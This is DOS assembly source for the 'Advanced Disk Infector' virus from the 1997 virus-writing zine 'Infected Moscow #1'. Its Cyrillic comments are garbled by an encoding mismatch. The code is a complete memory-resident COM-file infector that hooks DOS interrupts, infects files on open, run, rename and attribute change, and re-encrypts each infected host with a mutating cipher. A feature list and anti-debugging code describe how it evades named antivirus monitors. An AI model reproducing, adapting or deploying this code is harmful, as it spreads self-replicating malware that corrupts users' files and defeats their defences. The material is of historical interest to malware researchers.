旼컴컴컴컴컴컴컴컫컴쩡컴컴컴컫컴컴컴컴컴컴컴컴컴컴컴컴컴컴컫컴컴컴컴컴컴컴컴커
쿔NFECTED MOSCOW �#1� JAN'97 �(C)STEALTH Group MoscoW & Co � one@redline.ru  �
읕컴컴컴컴컴컴컴컨컴좔컴컴컴컨컴컴컴컴컴컴컴컴컴컴컴컴컴컴컨컴컴컴컴컴컴컴컴켸
旼컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컫컴컴컴컴컴컴컴컴컴컴컴컴�
� Advanced Disk Infector Virus                     � (C)                    �
읕컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컨컴컴컴컴컴컴컴컴컴컴컴컴�
;
;          (C) Copyright, 1994-97, by STEALTH group WorldWide, unLtd.
;
;                    (C) Copyright, 1997-98, by Beast, (SGWW)
;
;	뤲Ðβ ㏇�� 葉�졻�ワ� Infected Voice. 뫇晨�� 飡젺�˘恂� ℓα� � 
;겏沃ⅹ�. 눊Л�� 첓�Ø乘� � 說ⅲ� ㏇� ι� �β. 빇ㄸ� � 說줎沃졾. � �젶莘 ��．ㅳ
;15-20 ｀젮信�� ㄵ쳽筍 ¡�↓� �ηⅲ�. 궙� 歲ㄸ夭 ��誓� 聲�º ⅳÞ飡´��臾 呻�-
;蜈���� - XT'沃�� � CGA � �②θ� ˘贍. 룼첓 쭬 �ⅴ �� 碎ㄵ夭 收‥ 蓀젳� ｀�-
;㎤恂� 聲�� ㄵ殊蜈 �� ゥ�좈젰碎 ADinf'젹�. 쀢�-獸 ��エМ雪��� � 쵟稅ⓣ�˚��
;��誓쩆葉 �黍（췅レ�音 줎⒱. 곥獸¡� - 鼇菴莘耀� ㄸ稅. � �젶º 젷．黍燧�� -
;쭬�젲��⑨ 첓� CommanderBomber. 쀢� - 獸 �젶�� 譽� ▲ㄵ� ギ쵟筍 ㏇� �誓㎘舒�-
;殊�� Award'a, AMI, � 쩆┘ write protected 췅 ㄸ稅β졾. � ��첓 �誓ㅱ�젪ワ� 聲��
;��¡� �昔�㎖ⅳ���� - Advanced Disk Infector version 1.5 將� ㄾ��キ��췅�  � 쭬-
;��． ��誓�ⓤ젺췅� ��舒좑 ´褻⑨ ADinf'�. 눃α� ぎ� - 譽� α筍:
;
;1. 뇿〃쥯��� �鼇‘� int 24h
;2. 룼飡�輾�� ¡飡젺�˙���� int 1, int 0, int 3 췅 iret
;3. 뤲� 쭬�젲��Ŀ 쭬＋燼첓 int 8 � 信�젺�˚� 췅 iret int 2Ah (ㄻ� �＼젺� AVPTSR)
;4. 뜝若┐���� �黍（췅レ��． int 21h 曄誓� PSP � int 30h/31h
;5. 댾��レ㎯β碎 "꽓�þ좑 ���젮첓"
;6. 룼笹� 쭬�젲��⑨ ´刷 �젵� 鼇菴濕恂� ¸α收 � ˘說貰� � ㄾ줎˙畑恂� 
;   �졹鼇菴��蟯�.
;7. 뤲�璵ㅳ�� �졹鼇菴�˚� �젵쳽 - ��エМ雪췅. (細 �.6)
;8. 댂�＄� �젵� М┘� 〓筍 쭬鼇菴�쥯� 2-3 �젳�. (�恂在� �� 膝젮좄� ㄻÞ� ˘�� � 
;   ㏇ε �졹鼇菴��蟯ぎ�)
;9. 맆㎚�� ˘�� Д�麟� 췅 ((200-250)*ぎ�-¡_쭬鼇№�¡�) 줎⒱ 曄� �젶殊曄稅좑 
;   �黍줎˚� � �젵ャ.
;10.뜢 �∼졷拾Ð젰恂� Web'��. (꾝膝�� �� �昔‘쥯ギ刷)
;11.뜢 ゥ葉恂� ADinf'��
;12.뜢 �飡젺젪エ쥯β碎 AVPTSR'��
;13.귣貰첓� 稅�昔飡� �젳Л�┘�⑨. 귗� 押�ゆĿ DOS'� 췅 ℡�ㄵ DS:DX ぎ獸贍�
;   º� �젵쳽.
;14.맆㎚��쬊β碎 曄誓� �젵ギ�瑜 쭬蟯瞬 � 젺殊˘說說瑜 М�ⓥ�贍 (�誓㎘舒졻Ð�)
;   ˘碎蟯� 췅 int 21h
;15.닱 젺殊笠黍飡Ø� ⓤ��レ㎜쥯エ刷
;   1. 뇿�ⓤ� � �젩エ軟 ´も�昔�
;   2. 쀢���� �� ��設��
;   3. 뇿＋燼첓 int 3, int 1, int 0
;   4. 삩菴�˚�
;   5. 룼�젮첓 � 캙э筍 � 2 將젽� (曄誓� PSP:000A )
;   6. 귣㎜� mov ax,0E0E0h/int 21h/or al,al/jz $+4/int 20h/
;   7. 맆‘�� ˛� 캙쵟殊 �昔｀젹щ (far call in PSP:00FB) 
;16.롡率恂手�� ㄵ飡說ゆĿ. (僧泣ゥ����)
;17.뇿蟯�� Copyright'�.
;
;   P.S.  뤲Þ�嵬 聲�� �㎖Þ��⑨ 쭬 獸 譽� 將�� ˘� �� 쭬�젲젰� EXE-鈺Ø�
; �昔飡� ゥ�� >|-:). 눃α� � Д飡� 笹�쥯:
;
;뜢 � 殊�젲� 淞졹筍� - � � む졹�收 젷．黍燧�.
;
;  뇿�젲���� EXE'鈺Ø�� 飡젺쩆設��.
;
;  P.S.1. 곥ㅳ �젮 쭬 貰�↓���� � ヮ〓� ＋渽졾. 
;						(�) by Beast.
;
		.model tiny	; 앪� ㏇� ㎛좐� ㄻ� 曄．
		.code
		org	100h

Infected:	dec	bp  	  ; 뤲�㎛젶 쭬�젲��⑨ ㄻ� 貰む좈��⑨ 收쳽 ˘��
		jmp	WEB_IDIOT ; ��誓若� 췅 �젹� ㎛젰收 譽�

VIRR:		PUSH	CS	  ; 귘�昔� Þ飡젷汀��, 灑ㄵ ��誓쩆β碎 承�젪ゥ-
		POP	DS	  ; �ⅴ ��笹� 쭬´殲��⑨ �昔（-��歲收レ
		MOV	AH,48H	  
		MOV	BX,VP
		INT	21H	  ; �琉�エ� ㄻ� ��キ�． 淞졹筍�
		JNC	GOOD_ALLOCATE
		RET		  ; 빇舜 �젶ⓨ 歲栒졿Ł �� М┘� 〓筍, �� ㏇ⅵ�

GOOD_ALLOCATE:	PUSH	ES DS BX DX
		CALL	GET_ORIGINAL_INT_21H	; 꽡▲ㄵ� �黍（췅レ�硫 int 21h
		POP	DX BX DS ES
		MOV	ES,AX		; ES=췅� 醒，���
		CLD
		MOV	SI,0
		MOV	DI,SI		; 뇿ゥ㎘� � 캙э筍
		MOV	CX,VL
	REP	MOVSB
		MOV	DS,AX
		MOV	AX,3521H
	; 룯誓罌졻º int 21h
		INT	21H
		MOV	DS:[ADDRES21-VIRR+2],ES
		MOV	DS:[ADDRES21-VIRR],BX
		MOV	AX,2521H
		MOV	DX,INT21MANAGER-VIRR
		INT	21H

		MOV	AX,3524H	; 룯誓罌졻º int 24h
		INT	21H
		MOV	DS:[ADR24-VIRR+2],ES
		MOV	DS:[ADR24-VIRR],BX
		MOV	AX,2524H
		MOV	DX,NEW24H-VIRR
		INT	21H

		MOV	AX,3508H	; 룯誓罌졻º int 08h
		INT	21H
		MOV	DS:[ADR8-VIRR+2],ES
		MOV	DS:[ADR8-VIRR],BX
		MOV	AX,2508H
		MOV	DX,NEW8-VIRR
		INT	21H

		MOV	AX,251CH	; 룯誓罌졻º int 1Ch
		MOV	DX,NEW1CH-VIRR
		INT	21H

		MOV	BYTE PTR DS:[A24-VIRR],1 ; 앪� ㄻ� �□젩�洵Ø� int 24h
						 ; 稅젲�� 譽� ��� 醒⑴졹 젶殊�-
						 ; ��.
		PUSH	DS
		POP	AX
		DEC	AX
		MOV	ES,AX			; 收��閃 췅� ∥�� 캙э殊
		MOV	BYTE PTR ES:[1],8	; is DOS Reserved
		RET			

;*****************************************************************;
;*                      I N S T A L L E R                        *;
;*****************************************************************;
VirrInstall:	CALL	$+3		; 듽쩆 щ ��캙エ ?
		POP	SI
		SUB	SI,VIRRINSTALL-VIRR+3
		MOV	AX,9876H
		INT	21H
		JC	ALREADY_IN_MEM
   ;***********************************************************;
   ;                    I m p o r t a n t                     *;
   ;***********************************************************;
		PUSH	SI ES 
		MOV	BX,CS:[02]		; 췅ħ�� 젮誓� ゃ쩆 М┃� 醒飡�
		SUB	BX,VP			; � ��舒硫 �젳. 앪� ▲ㄵ� 췅鼇� 
		MOV	ES,BX			; №�Д��臾 �黍飡젺③��. (빇昔-
						; 溫 ℓα� ��笹�˘�� "뜢� �①�-
						; ． ‘ゥ� ��飡�輾��． 曄� №�-
						; Д����" 췅 ㄵ⒰手濕�
;--------------------------------------------
; 몺ㄸп� � 캙э筍 ��舒硫 �젳
;--------------------------------------------
		MOV	DI,0
		MOV	CX,VL
	REP	MOVSB
		MOV	AX,CS:[10]		; 뫌魚젺畑� �黍（췅レ�硫 젮誓� 
		MOV	ES:[FORRET-VIRR],AX	; ¡㎖�졻� (�젳№졻�)
		MOV	AX,CS:[12]
		MOV	ES:[FORRET-VIRR+2],AX
		MOV	AX,ES			; � 信�젺�˘� 젮誓� �젳№졻�
		MOV	CS:[12],AX		; (¡㎖�졻�) 췅 聲�� №�Д����
		MOV	AX,RETURN-VIRR		; �黍飡젺③�
		MOV	CS:[10],AX
		POP	ES SI
ALREADY_IN_MEM:

;--------------------------------------------
; 궙㎖�졻 �黍（췅レ�音 줎⒱ 췅 Д飡�
;--------------------------------------------
		MOV	DI,100H			; ��ㄻηº 췅嵬 �㎚晨���莘 �昔-
		PUSH	DI			; ｀젹� - ��歲收レ, 若舜 承�젪-
		ADD	SI,BYTES-VIRR		; ゥ��� ι� �젳 ㏇� �젪�� �췅
		MOVSW				; 췅� �搜졹�
		MOVSW
		RET

NEW_BYTES:	DEC	BP    ; 뙠洙� 쭬�젲����飡�
		DB	0E9H
JMP_ADR		DW	?

;--------------------------------------------------------------------
; 뜝 將�� ゃ貰曄� 캙쩆β Жギ飡� �昔璵遜��� ��笹� 쭬´殲��⑨ �昔（
;--------------------------------------------------------------------
RETURN:		CALL	VIRR  ;將� �젹� ㎛젰收 譽� 췅 췅� ™�昔� Þ飡젷汀��
		DB	0EAH  ;JMP Far 췅 �昔｀젹с 쭬�信殊�嵬� �昔ｃ � ぎ獸昔�
FORRET		DD	?     ;щ 信�θ�� �昔Þ飡說エ昔쥯エ刷.

;--------------------------------------------
; � 將� �黍（췅レ�瑜 줎⒱� �昔｀젹щ.
;--------------------------------------------
BYTES:		NOP
		NOP
		INT	20H

;--------------------------------------------
;       뜮�硫 �□젩�洵Ø 21-�． Þ收�젽��
;--------------------------------------------
INT21MANAGER:	
		PUSHF
		CMP	AX,9876H	; 뤲�´黍筍 �� �昔碎� エ � 췅� 貰´��
		JNE	NO_BROTHER	; Þ飡젷ⓣ�쥯筍碎 Œ� �β?
		POPF
		STC
		RETF	2
NO_BROTHER:
				; 앪� 召ⓤ�� 押�ゆŁ �黍, ぎ獸贍� 
				; �昔ⓤ若ㄸ� 쭬�젲����

		CMP	AH,3DH	; 롡む淫��
		JE	CHECK
		CMP	AH,4BH	; 댾��キ����
		JE	CHECK
		CMP	AH,43H	; 뫊�췅 졻黍▲獸�
		JE	CHECK
		CMP	AH,56H	; 룯誓º���쥯���
		JE	CHECK
		JMP	NO_CHECK_DS_DX
CHECK:		PUSH	AX BX CX DX DS ES DI SI BP
		CALL	INFECTION	; 뇿�렑���� (昔┐���� ˘��)
		POP	BP SI DI ES DS DX CX BX AX
		JMP	NO_CHECK
NO_CHECK_DS_DX:
		; � 將� Д飡� ㄻ� ヮ〃收ゥ� 誠�쳽筍 쭬�젲���� �� 4e/4f
NO_CHECK:
		POPF
		DB	0EAH	; Far JUMP 췅 쩆ゥぎ �� �黍（췅レ�硫, 쭬��짛-
ADDRES21	DD	?	; ���硫 �誓㎘舒졻Ð젹� int 21h

;---------------------------------------------------------------------------
; 뇿�젲���� �젵ギ� DS:DX - file name for infection
;---------------------------------------------------------------------------

INFECTION:	MOV	AX,3D00h ; No comment ;)
		CALL	OR21	 
		JNC	$+3
		RET
		MOV	BX,AX
		PUSH	AX		; Don't worry it just get
		MOV	AX,1220H	; System File's Tabel
		INT	2FH
		MOV	BL,BYTE PTR ES:[DI]
		MOV	AX,1216H
		INT	2FH
		POP	BX
		MOV	BYTE PTR ES:[DI+2],2	; Now he is read/write opened
		PUSH	CS
		POP	DS
		
		MOV	DX,OFFSET BYTES-OFFSET VIRR
		MOV	CX,4			; Read first 4 bytes
		MOV	AH,3FH
		INT	21H
		CMP	BYTE PTR DS:[BYTES-VIRR],'M' ; It infected or EXE
		JE	CLOSE
		MOV	AX,ES:[DI+17]
		CMP	AX,60000		; We can't infect above 60000
		JA	CLOSE
		CMP	AX,VL			; and don't want bellow VirLen
		JB	CLOSE
		CMP	WORD PTR ES:[DI+32],'OC' ; Don't infect CO??????.COM
		JE	CLOSE
		CMP	WORD PTR ES:[DI+32+8],'OC' ; Check: Does it CO? file
		JNE	CLOSE			   ; No
		MOV	ES:[DI+21],AX		   ; Yes
		ADD	AX,WEB_IDIOT-VIRR-4	   ; Make jump to anti-web 
		MOV	DS:[JMP_ADR-VIRR],AX	   ; pattern

		push	bx			; Turn off int 8h
		CALL	OFF_08_24_2A		; int 24h and int 2ah
		pop	bx

		MOV	AH,40H			; Write virus body in file
		CWD
		MOV	CX,VL
		CALL	OR21

		XOR	AX,AX
		MOV	ES:[DI+21],AX

		MOV	AH,40H			; And write jump to begin file
		MOV	DX,NEW_BYTES-VIRR
		MOV	CX,4
		CALL	OR21

AGAIN_PROTECT:	CALL	CRYPT_ALL_FILE		; Call suboutine for crypt all
		IN	AL,40H			; file
		CMP	AL,10h			; Cay we do it again
		JB	AGAIN_PROTECT		; Yes ! ! !

		CALL	ON_08_24_2A		; Turn on int 8 and int 24h
CLOSE:
		MOV	AH,3EH			; Close him.
		INT	21H
		RET

OR21:		PUSHF				; 앪� �留�� 葉飡�． 첓� 笹ⅶ� 
		PUSH	CS			; int 21h
		CALL	ORIG_INT_21
		RET
ORIG_INT_21:
		DB	0EAH
TRACED_21H	DW	?,?


;--------------------------------------------------------------------------
; 귣か蹟���� int 8, int 24h, int 2Ah
;--------------------------------------------------------------------------

OFF_08_24_2A:	MOV	BYTE PTR DS:[A24-virr],0
		IN	AL,21H	
		OR	AL,1
		OUT	21H,AL
		MOV	AX,252AH
		MOV	DX,NEW2AH-VIRR
		CALL	OR21
		RET


;--------------------------------------------------------------------------
; 궕ヮ曄��� int 8, int 24h, int 2Ah
;--------------------------------------------------------------------------

ON_08_24_2A:	IN	AL,21H
		AND	AL,11111110B
		OUT	21H,AL
		MOV	BYTE PTR DS:[A24-VIRR],1
		RET
A24		DB	1

NEW24H:		PUSHF
		CMP	BYTE PTR CS:[A24-VIRR],0
		JNE	ACTIVE24H
		POPF
		MOV	AL,3
NEW2AH:
		IRET
ACTIVE24H:	DB	0EAH
ADR24		DW	?,?


;---------------------------------------------------------------------------
; 꽡飡젪젺�� �黍（췅レ��． int 21h. 뜝 �音�ㄵ � TRACED_21H �黍（췅レ�硫 21h.
;---------------------------------------------------------------------------

GET_ORIGINAL_INT_21H:
		CALL	PSP_TRACE
		JNC	FOUNDED_21H
		CALL	INT30_TRACE
		JNC	FOUNDED_21H
		MOV	AX,3521H
		INT	21H
		PUSH	ES
		POP	DS
		MOV	BX,DX
FOUNDED_21H:	MOV	WORD PTR CS:[TRACED_21H+2-VIRR],DS
		MOV	WORD PTR CS:[TRACED_21H-VIRR],BX
		RET
PSP_TRACE:	LDS	BX,DS:[6]
TRACE_NEXT:	CMP	BYTE PTR DS:[BX],0EAH
		JNZ	CHECK_DISPATCH
		LDS	BX,DS:[BX+1]
		CMP	WORD PTR DS:[BX],9090H
		JNZ	TRACE_NEXT
		SUB	BX,32H
		CMP	WORD PTR DS:[BX],9090H
		JNZ	CHECK_DISPATCH
GOOD_SEARCH:	CLC
		RET
CHECK_DISPATCH:	CMP	WORD PTR DS:[BX],2E1EH
		JNZ	BAD_EXIT
		ADD	BX,25H
		CMP	WORD PTR DS:[BX],80FAH
		JZ	GOOD_SEARCH
BAD_EXIT:	STC
		RET
INT30_TRACE:	SUB	BX,BX
		MOV	DS,BX
		MOV	BL,0C0h
		JMP	SHORT TRACE_NEXT

CRYPT_ALL_FILE:

		CALL	MUTATION    ; 뇿с殊昔쥯筍 鼇菴��蟯� � �졹蟯菴��蟯�

		IN	AX,40H
		MOV	WORD PTR DS:[WITH_AX+1-VIRR],AX
					; 뇿 �ⓤ잂� �졹鼇№��蟯� � �黍（췅レ�瑜
		MOV	AX,ES:[DI+17]	; 줎⒱� ˘說��
		SUB	AX,4
		PUSH	AX
		MOV	DS:[ENCRYPT-VIRR+1],AX

		MOV	DS:[EN_JMP+2-VIRR],AX
		
		SUB	AX,AX
		MOV	Es:[DI+21],AX

		MOV	CX,4
		MOV	AH,3FH
		MOV	DX,VIR_BYTES-VIRR
		CALL	OR21


		MOV	AX,ES:[DI+17]
		MOV	ES:[DI+21],AX
		MOV	CX,EL
		MOV	DX,ENCRYPT-VIRR
		MOV	AH,40H
		CALL	OR21

		XOR	AX,AX
		MOV	Es:[DI+21],AX
		MOV	AH,40H
		MOV	CX,4
		MOV	DX,EN_JMP-VIRR
		CALL	OR21
		POP	CX
		mov	ax,ds:[with_ax-virr+1]   ; � AX 笹晨젵��� ㎛좂����
CRYPT_LOOP:
		CALL	READ_BYTE		 ; �昔葉�졻� 줎⒱ �昔（
		MOV	SI,REZ-VIRR

;  � �   � � � � � �   � � � � � � � 

		SUB	BYTE PTR [SI],CH
		SUB	BYTE PTR [SI],CL
		SUB	BYTE PTR [SI],AH
		SUB	BYTE PTR [SI],AL

		ADD	BYTE PTR [SI],CH
		ADD	BYTE PTR [SI],CL
		ADD	BYTE PTR [SI],AH
		ADD	BYTE PTR [SI],AL

		XOR	BYTE PTR [SI],CH
		XOR	BYTE PTR [SI],CL


		XOR	BYTE PTR [SI],AH
CRYPT_DATA:
		XOR	BYTE PTR [SI],AL

		CALL	WRITE_BYTE	; �盾ⅶ� 췅쭬� � 쭬�ⓤ� 줎⒱�

CRYPT_DATA1:	ADD	AL,CL
		ADD	AL,AH
		ADD	AL,AL
		ADD	AL,AH

		ADD	AH,CL
		ADD	AH,AH
		ADD	AH,AL
		ADD	AH,AH

		XOR	AL,AH
		XOR	AL,CL
		XOR	AL,CH

		XOR	AH,AL
		XOR	AH,CL
		XOR	AH,CH

		ROL	AL,CL
		ROL	AH,CL
		XCHG	AH,AL
		ROR	AH,CL
		ROR	AL,CL

		LOOP	CRYPT_LOOP
		RET
;---------------------------------------------------
; 맆訟ⓧ昔�蟯� �젵쳽
;---------------------------------------------------
ENCRYPT:	MOV	CX,0
		CALL	$+3
		POP	SI
		SUB	SI,6

;-------------------------------------------------------------------------------
; ��殊-笠黍飡Ø� ��誓쩆筍 承�젪ゥ��� Д洙� NXT_C � 쭬�ⓨ�呻� � 飡ⅹ CS � 100h
;-------------------------------------------------------------------------------
		LEA	BX,[SI+NXT_C-ENCRYPT]
		MOV	BYTE PTR CS:[0FBH],9AH ; Far call 
		MOV	WORD PTR CS:[0FCH],BX
		MOV	WORD PTR CS:[0FEH],DS
		mov	ax,0fbh
		push	ax
		ret
NXT_C:
		ADD	SI,VIR_BYTES-ENCRYPT
		MOV	DI,100H
		MOVSW
		MOVSW
		MOV	DI,104H

WITH_AX:	MOV	AX,0
		jmp	out_copyright
		db	10,13
copyRIGHT	DB	'  (c) Beast. Advanced Disk Infector. [ADinf v1.5]',0,10,13
out_copyright:	PUSH	AX
;-------------------------------------------------------------------------------
; ��殊 - 笠黍飡Ø�
;-------------------------------------------------------------------------------
		SUB	AX,AX
		mov	es,ax
		mov	es:[0],ax
		cmp	es:[0],ax
		je	$+4
		int	20h
;-------------------------------------------------------------------------------
; ��殊 - 笠黍飡Ø�
;-------------------------------------------------------------------------------

		mov	ax,0e0e0h
		int	21h
		or	al,0
		jz	$+4
		int	20h
;-------------------------------------------------------------------------------
; ��殊 - 笠黍飡Ø�
;-------------------------------------------------------------------------------

		in	al,40h
		or	al,al
		jnz	$+4
		int	20h

		POP	AX
		push	cs
		pop	es
ENCRYPT_LOOP:

;  � �   � � � � � �   � � � � � � �

DECRYPT_DATA:	XOR	BYTE PTR [DI],AL
		XOR	BYTE PTR [DI],AH
		XOR	BYTE PTR [DI],CL
		XOR	BYTE PTR [DI],CH

		SUB	BYTE PTR [DI],AL
		SUB	BYTE PTR [DI],AH
		SUB	BYTE PTR [DI],CL
		SUB	BYTE PTR [DI],CH

		ADD	BYTE PTR [DI],AL
		ADD	BYTE PTR [DI],AH
		ADD	BYTE PTR [DI],CL
		ADD	BYTE PTR [DI],CH


DECRYPT_DATA1:	ADD	AL,CL
		ADD	AL,AH
		ADD	AL,AL
		ADD	AL,AH

		ADD	AH,CL
		ADD	AH,AH
		ADD	AH,AL
		ADD	AH,AH

		XOR	AL,AH
		XOR	AL,CL
		XOR	AL,CH

		XOR	AH,AL
		XOR	AH,CL
		XOR	AH,CH

		ROL	AL,CL
		ROL	AH,CL
		XCHG	AH,AL
		ROR	AH,CL
		ROR	AL,CL

		INC	DI
		LOOP	ENCRYPT_LOOP
		RETF
VIR_BYTES	DB	90h,90h,90H,0C3h
EL		EQU	$-ENCRYPT
EN_JMP:		DEC	BP
		DB	0E9h
		DW	?
REZ		DB	?

READ_BYTE:	push	ax cx		; ⓤ��レ㎯β碎 � 鼇菴�˚�
		MOV	AH,3FH
		JMP	SHORT FIN_DOS_OP

WRITE_BYTE:	PUSH	AX CX
		MOV	AH,40H
		DEC	WORD PTR ES:[DI+21]
FIN_DOS_OP:
		MOV	DX,REZ-VIRR
		MOV	CX,1
		CALL	OR21
		pop	cx ax
		RET

NEW1CH:		CALL	RESTORE_00_01_03
		IRET

NEW8:		CALL	RESTORE_00_01_03
		DB	0EAH
ADR8		DW	?,?

RESTORE_00_01_03:
		PUSHF
		PUSH	AX DS
		XOR	AX,AX
		MOV	DS,AX
		MOV	WORD PTR DS:[0],NEW2AH-VIRR	; iret
		MOV	WORD PTR DS:[2],CS
		MOV	WORD PTR DS:[4],NEW2AH-VIRR	; iret
		MOV	WORD PTR DS:[6],CS
		MOV	WORD PTR DS:[12],NEW2AH-VIRR	; iret
		MOV	WORD PTR DS:[14],CS
		POP	DS AX
		POPF
		RET

MUTATION:	PUSH	SI DI BX
		MOV	WORD PTR DS:[UP_RND-VIRR],11
		MOV	WORD PTR DS:[DOWN_RND-VIRR],0
		MOV	SI,DECRYPT_DATA-VIRR
		MOV	DI,SI
		CALL	GET_RND		; 룼ャ葉筍 笹晨젵��� 葉笹�
		SHL	BX,1
		PUSH	BX
		ADD	SI,BX
		CALL	GET_RND		; � ��ャ葉筍 ™�昔� � � 貰��-
		SHL	BX,1		; ´恂手Ŀ � �º� ぎ쵟�ㅻ � 鼇菴��鼇ぅ
		PUSH	BX		; � �졹鼇菴��蟯ぅ
		ADD	DI,BX
		CALL	XCHG_SI_DI
		
		MOV	DI,CRYPT_DATA-VIRR
		MOV	SI,DI ;CRYPT_DATA-VIRR-2
		POP	BX
		SUB	DI,BX
		POP	BX
		SUB	SI,BX
		CALL	XCHG_SI_DI

		POP	BX DI SI
		RET

UP_RND		DW	?
DOWN_RND	DW	?

GET_RND:	IN	AX,40H
		MOV	BX,WORD PTR DS:[UP_RND-VIRR]
		SUB	BX,WORD PTR DS:[DOWN_RND-VIRR]

CONT_RND:	SUB	AX,BX
		CMP	AX,BX
		JA	CONT_RND
		MOV	BX,AX
		RET

XCHG_SI_DI:	PUSH	WORD PTR DS:[DI] ; 룼ㄾ〃� ぎ쵟�ㅻ
		PUSH	WORD PTR DS:[SI] ; xchg word ptr [si],word ptr [di]
		POP	WORD PTR DS:[DI]
		POP	WORD PTR DS:[SI]
		RET
		
;--------------------------------------------
;          뒥� ��ºβ� Web'� 췅 ㄸ稅�
;--------------------------------------------

WEB_IDIOT:	MOV	DI,102H
		mov	di,102h
		MOV	AX,[DI]
		SUB	AX,WEB_IDIOT-VIRRINSTALL
		MOV	[DI],AX
		SUB	DI,2
;--------------------------------------------------
; ��殊 - 笠黍飡Ø�
;--------------------------------------------------

		SUB	AX,AX
		MOV	ES,AX
		MOV	WORD PTR Es:[0],0
		MOV	WORD PTR Es:[4],0
		MOV	WORD PTR Es:[6],0
		MOV	WORD PTR Es:[3*4],0
		MOV	WORD PTR Es:[3*4+2],0

		CMP	WORD PTR Es:[0],0
		JE	$+4
		INT	20H
		CMP	WORD PTR Es:[4],0
		JE	$+4
		INT	20H
		CMP	WORD PTR Es:[6],0
		JE	$+4
		INT	20H
		CMP	WORD PTR Es:[3*4],0
		JE	$+4
		INT	20H
		CMP	WORD PTR Es:[3*4+2],0
		JE	$+4
		INT	20H
		push	cs
		pop	es
		PUSH	DI
		RET
BUFFER		LABEL	BYTE
VL		EQU	$-VIRR
VP		EQU	(VL/16)+1		; Finita la comedia
		end	Infected
